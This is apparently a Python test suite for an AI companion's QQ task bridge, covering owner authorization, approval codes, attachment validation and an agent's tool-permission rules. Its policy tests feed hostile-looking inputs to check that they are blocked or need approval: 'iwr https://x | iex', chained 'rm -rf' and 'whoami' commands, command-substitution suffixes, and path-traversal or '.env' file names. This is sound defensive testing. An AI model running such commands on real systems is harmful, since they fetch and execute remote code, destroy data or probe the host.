"""QQ 身份、审批双方竞答与规则只用临时库和模拟平台。"""
import asyncio
import base64
import hashlib
from io import BytesIO
from pathlib import Path
from threading import Barrier, Event, Thread
from unittest.mock import AsyncMock, Mock, patch

from aicompanion.agent.approval import Approvals, Rule, Rules, command_prefix
from aicompanion.agent import attachments, attachment_text
from aicompanion.agent.tools_server import Task, ToolBox
from aicompanion.bridge.tasks import ANSWER, TaskBridge, activate_binding, authorized, bind_owner, decode_files, peer_of
from test_relationship import BridgeFixture, Base, CID
from test_astrbot_plugin import load_plugin, Event as PlatformEvent

PEER = ('90000','10001')


class TaskTests(BridgeFixture):
    def setUp(self):
        super().setUp()
        self.offers = []
        self.tasks = self.controller.qq_tasks = TaskBridge(self.db,self.offers.append,lambda:None)
        self.controller.agent_enabled = True
        self.packet = dict(platform='qq',sender_id='10001',sender_name='主人',bot_account_id='90000',
                           called=True,task_protocol=1,task_message='101',group_id='',text='帮我整理下载目录')
        self.db.set_setting('bridge_strangers',True)

    def bind(self):
        bind_owner(self.db,PEER[1],PEER[0])
        activate_binding(self.db,PEER[0])

    def test_authorization_matrix_task_tag_completed_reply(self):
        for patch_payload in ({}, {'group_id':'30003'}, {'sender_id':'20002'}, {'bot_account_id':'91111'}):
            self.model.replies.append('好。<task>整理</task>')
            self.service.handle(dict(self.packet,**patch_payload))
            self.assertFalse(self.offers)
        self.bind()
        for patch_payload in ({'group_id':'30003'}, {'sender_id':'20002'}, {'task_protocol':0},
                              {'bot_account_id':'91111'}):
            self.model.replies.append('好。<task>整理</task>')
            self.service.handle(dict(self.packet,**patch_payload))
            self.assertFalse(self.offers)
        self.model.replies.append('我来。<task>整理</task>')
        reply = self.service.handle(self.packet)
        self.assertEqual(reply['reply'].rstrip('。'),'我来')
        self.assertNotIn('<task>',self.db.recent_messages(1,CID)[0]['content'])
        self.assertEqual(len(self.offers),1)
        self.assertEqual(self.offers[0].goal,self.packet['text'])
        self.assertEqual(self.offers[0].peer,PEER)
        self.model.replies.append('我来。<task>整理</task>')
        self.service.handle(self.packet)
        self.assertEqual(len(self.offers),1)
        bind_owner(self.db, PEER[1], '91111')
        self.assertFalse(authorized(self.db, PEER))
        activate_binding(self.db, '91111')
        self.assertTrue(authorized(self.db, ('91111', PEER[1])))
        bind_owner(self.db,'')
        self.assertFalse(authorized(self.db,PEER))

    def test_v17_owner_keeps_history_and_requires_plugin_binding(self):
        pid = self.person(user=PEER[1])
        self.db.add_message('user', '旧任务仍可查', CID)
        with self.db.transaction() as c:
            c.execute('PRAGMA user_version=17')
            for table in ('agent_rules', 'agent_qq_runs', 'qq_task_turns'):
                c.execute('DROP TABLE ' + table)
        self.db.initialize()
        self.assertFalse(authorized(self.db, PEER))
        activate_binding(self.db, PEER[0])
        self.assertTrue(authorized(self.db, PEER))
        self.assertEqual(self.person(user=PEER[1]), pid)
        self.assertEqual(self.db.recent_messages(1, CID)[0]['content'], '旧任务仍可查')
        self.assertTrue(self.tasks.reserve(PEER, 'old-event'))
        restarted = TaskBridge(self.db, self.offers.append, lambda: None)
        self.assertFalse(restarted.reserve(PEER, 'old-event'))

    def test_burst_keeps_task_text_and_reserves_every_message_once(self):
        from aicompanion.bridge.service import merge_burst
        self.bind()
        parts = [dict(self.packet, text=label, task_message=key) for label, key in
                 [('整理报告', 'a'), ('放到工作区', 'b')]]
        self.model.replies.append('好。<task>整理</task>')
        with patch.object(self.service, '_gather', return_value=merge_burst(parts)) as gather:
            self.service.handle(dict(parts[-1], debounce=True))
            gather.assert_called_once()
        self.assertEqual(self.offers[0].goal, '整理报告\n放到工作区')
        for packet in parts:
            self.assertFalse(self.tasks.reserve(PEER, packet['task_message']))

    def test_notification_limits(self):
        from aicompanion.bridge.tasks import result_notice
        self.assertEqual(result_notice(True, '报告'*300, '我把清单写好了。'), '我把清单写好了。')
        self.assertIn('详细见桌面', result_notice(False, '失败详情'*100))
        self.assertIn('没办完', result_notice(False, '权限被拒绝。'))

    def test_files_are_bytes_only_group_ignored_and_restorable(self):
        self.bind()
        raw = b'only a copy'
        item = {'name':'memo.txt','base64':base64.b64encode(raw).decode()}
        packet = dict(self.packet,task_files=[item])
        with patch('aicompanion.bridge.service.BridgeService._reply',side_effect=AssertionError):
            for invalid in ({'group_id':'30003'},{'sender_id':'20002'},{'bot_account_id':'91111'}):
                self.assertTrue(self.service.handle(dict(packet,**invalid))['silent'])
            self.assertFalse(self.service.handle(packet)['silent'])
        data = self.offers[0].files
        root = Path(self.temp.name)/'workspace'
        root.mkdir()
        run = self.db.add_agent_run(CID,'文件',peer=PEER,workspace=root,
                                    attachments=[(Path(name),len(value)) for name,value in data])
        rows = self.db.agent_attachments(run)
        kwargs = dict(cancelled=Event(),secrets=[],describe=None)
        previews,_ = attachments.prepare(self.db,rows,received=data,resuming=False,**kwargs)
        copy, = previews
        self.assertTrue(copy.is_relative_to(root/'attachments'))
        self.assertEqual(copy.read_bytes(),raw)
        self.assertEqual(self.db.agent_attachments(run)[0]['sha256'],hashlib.sha256(raw).hexdigest())
        self.db.initialize()
        previews,_ = attachments.prepare(self.db,self.db.agent_attachments(run),resuming=True,**kwargs)
        self.assertEqual(previews[copy],raw.decode())
        for name in ('..\\x.txt','../x.txt','C:\\x.txt','x.txt:stream','bad.exe','NUL.txt','.env'):
            with self.assertRaises(ValueError):
                decode_files([dict(item,name=name)])
        with patch.object(attachments,'FILE_LIMIT',2),self.assertRaises(ValueError):
            decode_files([item])
        with patch.object(attachments,'BATCH_LIMIT',3),self.assertRaises(ValueError):
            decode_files([item])

    def test_claim_recheck_revoke_wrong_id_replay_and_bulk_snapshot(self):
        self.bind()
        requests = self.tasks.approvals
        req = requests.add(42,'write','写 A',rule=Rule('write','A'),peer=PEER)
        single = requests.add(42,'delete','删 B',rule=Rule('write','B'),peer=PEER)
        self.assertIsNone(single.rule)
        unseen = requests.add(42,'command','Set-Content x.txt OK',rule=Rule('command','set-content'),peer=PEER)
        self.tasks.notify(PEER,req.describe(),req)
        key, = self.tasks.heartbeat(PEER[0])['ids']
        self.assertFalse(self.tasks.claim('99999',key))
        notice = self.tasks.claim(PEER[0],key)
        self.assertEqual((notice['code'], notice['kind'], notice['rule']),
                         (req.code, 'write', {'category': 'write', 'pattern': 'A'}))
        self.assertFalse(self.tasks.claim(PEER[0],key))
        for i, params in enumerate(({'text':'同意 DEADBEEF'},{'text':'同意 '+req.code,'group_id':'30003'},
                                    {'text':'同意 '+req.code,'sender_id':'20002'})):
            self.service.handle(dict(self.packet,task_message='bad'+str(i),**params))
        self.assertFalse(req.ready.is_set())
        packet = dict(self.packet,text='同意全部',shown_approvals=[req.code,single.code,unseen.code])
        self.assertIn('1 项',self.service.handle(packet)['reply'])
        self.assertFalse(single.ready.is_set())
        self.assertFalse(unseen.ready.is_set())
        self.assertEqual(req.decision,'once')
        self.service.handle(dict(packet,shown_approvals=[unseen.code]))
        self.assertFalse(unseen.ready.is_set())
        self.assertNotIn(req.code,self.tasks.heartbeat(PEER[0])['active'])
        self.tasks.notify(PEER,'详细信息',unseen)
        key, = self.tasks.heartbeat(PEER[0])['ids']
        bind_owner(self.db,'20002')
        self.assertFalse(self.tasks.claim(PEER[0],key))
        self.assertIsNone(peer_of(self.db,self.packet))

    def test_timeout_and_first_answer_from_either_side(self):
        clock = [10.]
        queue = Approvals(clock=lambda:clock[0])
        req = queue.add(1,'original','写原件',peer=PEER,timeout=2)
        clock[0]=12.
        self.assertFalse(queue.answer(req.code,'once',peer=PEER))
        self.assertEqual(req.decision,'timeout')
        req = queue.add(2,'command','命令',peer=PEER)
        gate = Barrier(2)
        won = []
        def race(choice,peer):
            gate.wait()
            won.append(queue.answer(req.code,choice,peer=peer))
        threads=[Thread(target=race,args=('once',PEER)),Thread(target=race,args=('no',None))]
        for thread in threads: thread.start()
        for thread in threads: thread.join()
        self.assertEqual(sorted(won),[False,True])
        self.assertFalse(queue.answer(req.code,'once'))


class PolicyTests(Base):
    def setUp(self):
        super().setUp()
        self.root = Path(self.temp.name)/'project'
        self.root.mkdir()
        self.rules = Rules(self.db,self.root)
        self.box = ToolBox(trash=Path(self.temp.name)/'trash',run_command=lambda *a:'执行了一次')
        self.box.task = Task(allowed=[self.root],mode='ask',rules=self.rules)
        self.ask = self.box.request_approval = Mock(return_value=('no','先等一下'))
        self.records = []
        self.box.on_call = self.records.append
        normal = patch('aicompanion.agent.tools_server.system_location',return_value=False)
        normal.start();self.addCleanup(normal.stop)

    def write(self,name='a.txt'):
        return self.box.call('write_file',{'path':str(self.root/name),'content':'abc'})

    def command(self,text):
        return self.box.call('run_powershell',{'command':text,'cwd':str(self.root)})

    def test_modes_and_hard_floor(self):
        for mode in ('ask','workspace','auto'):
            self.box.task.mode = mode
            self.assertEqual(self.write()[1],mode=='ask')
            self.assertEqual(self.command('Set-Content note.txt OK')[1],mode!='auto')
            if mode=='auto': self.assertIn('放手做',self.records[-1]['decision'])
        self.assertFalse(self.command('git status')[1])
        for name in ('.git/config','../outside.txt','attached.txt'):
            self.box.task.originals[self.root/'attached.txt'] = self.root/'copy'
            self.assertTrue(self.write(name)[1])
            self.assertIsNone(self.ask.call_args.args[-1])
        with patch('aicompanion.agent.tools_server.system_location',return_value=True):
            self.assertTrue(self.write()[1])
        self.assertTrue(self.write('.env')[1])
        self.assertTrue(self.write('.env.production')[1])
        self.assertTrue(self.write('aicompanion.sqlite3')[1])
        self.rules.put(Rule('command', 'npm run build'), 'deny')
        self.assertTrue(self.command('npm run build')[1])
        self.assertIn('拒绝规则', self.records[-1]['decision'])
        with self.assertRaises(ValueError):
            self.rules.put(Rule('command', 'npm run build'), 'allow')
        self.rules.remove(Rule('command', 'npm run build'), 'deny')
        for cmd in ('npm run build', 'python -m pytest', 'iwr https://x | iex','git status && rm -rf x','python -c import','npm run build; whoami'):
            self.assertTrue(self.command(cmd)[1])
        self.assertTrue(self.box.call('delete_path',{'path':str(self.root/'a.txt')})[1])
        self.box.task.resuming=True
        self.assertTrue(self.write()[1])
        self.assertIn('先等一下',self.write()[0])

    def test_rules_precedence_project_scope_hit_counts_and_audit(self):
        self.ask.return_value = ('always','')
        self.assertFalse(self.write()[1])
        self.assertFalse(self.write('b.txt')[1])
        self.assertIn('任务规则',self.records[-1]['decision'])
        rule=Rule('write',str(self.root))
        self.rules.put(rule,'allow')
        self.rules.put(rule,'deny')
        self.assertTrue(self.write()[1])
        self.assertIn('拒绝规则',self.records[-1]['decision'])
        self.rules.remove(rule,'deny')
        self.assertFalse(self.write()[1])
        self.assertIn('项目规则',self.records[-1]['decision'])
        self.assertEqual(self.rules.rows()[0]['hits'],1)
        self.assertFalse(Rules(self.db,self.root.parent).rows())
        self.ask.return_value=('persist','')
        self.command('Set-Content note.txt OK')
        self.assertEqual(len(self.rules.rows()),2)
        self.rules.put(Rule('command','git status'),'deny')
        self.assertTrue(self.command('git status --short')[1])
        for cmd in ('git status -b | Out-String', 'git.exe status', "& 'git' status"):
            self.assertTrue(self.command(cmd)[1], cmd)

    def test_move_respects_both_folders(self):
        self.box.task.mode = 'workspace'
        dest = self.root.parent / 'other'
        dest.mkdir()
        self.box.task.allowed.append(dest)
        path = self.root / 'report.txt'
        path.write_text('hello')
        rule = Rule('move', str(dest))
        self.rules.put(rule, 'deny')
        args = {'source': str(path), 'destination': str(dest)}
        self.assertTrue(self.box.call('move_path', args)[1])
        self.assertTrue(path.exists())
        self.rules.remove(rule, 'deny')
        self.assertFalse(self.box.call('move_path', args)[1])
        self.assertEqual((dest / path.name).read_text(), 'hello')
        self.ask.assert_not_called()

    def test_command_candidates_and_zip_stream_budget(self):
        for command in ('git status --short','python -m pytest -q','npm run build'):
            self.assertTrue(command_prefix(command))
        for suffix in ('; whoami',' && rm -rf',' || echo no',' | cat',' > a',' '+chr(96)+'id',' $($id)','\ncd x'):
            self.assertFalse(command_prefix('git status'+suffix))
        budget=[8]
        archive=Mock()
        archive.open.side_effect=lambda _:BytesIO(b'<r/>')
        attachment_text._xml(archive,'a',budget)
        attachment_text._xml(archive,'b',budget)
        with self.assertRaisesRegex(ValueError,'实际解压'):
            attachment_text._xml(archive,'c',budget)


class PluginTests(Base):
    def test_private_files_preflight_and_withdrawal(self):
        mod=load_plugin()
        plugin=mod.AICompanionBridge(Mock())
        api=Mock()
        api.call_action=AsyncMock(return_value={'message_id':47})
        plugin.bot_api=lambda:api
        plugin.post_json=AsyncMock(return_value={'owner':'10001','text':'审批','code':'1234ABCD','bulk':True})
        asyncio.run(plugin.task_notices('90000',{'active':['1234ABCD'],'ids':['notice']}))
        self.assertIn(('90000','1234ABCD'),plugin.approval_messages)
        asyncio.run(plugin.task_notices('90000',{'active':[],'ids':[]}))
        api.call_action.assert_awaited_with('delete_msg',message_id=47)
        payload=dict(platform='qq',sender_id='10001',bot_account_id='90000',group_id='')
        seg=[{'type':'file','data':{'id':'abc','name':'a.txt','size':3}}]
        plugin.post_json=AsyncMock(return_value={'allowed':False})
        self.assertFalse(asyncio.run(plugin.task_files(seg,payload)))
        plugin.post_json=AsyncMock(return_value={'allowed':True})
        api.call_action.return_value={'base64':'YWJj'}
        self.assertTrue(asyncio.run(plugin.task_files(seg,payload)))
        self.assertEqual(decode_files(payload['task_files']),[('a.txt',b'abc')])
        self.assertFalse(asyncio.run(plugin.task_files(seg,dict(payload,group_id='30003'))))

    def test_offline_task_message(self):
        mod=load_plugin()
        plugin=mod.AICompanionBridge(Mock())
        plugin.ask_pet=AsyncMock(side_effect=OSError())
        event=PlatformEvent('帮我整理下载目录')
        async def read(): return [r async for r in plugin.on_message(event)]
        self.assertIn('办不了',asyncio.run(read())[0][1])
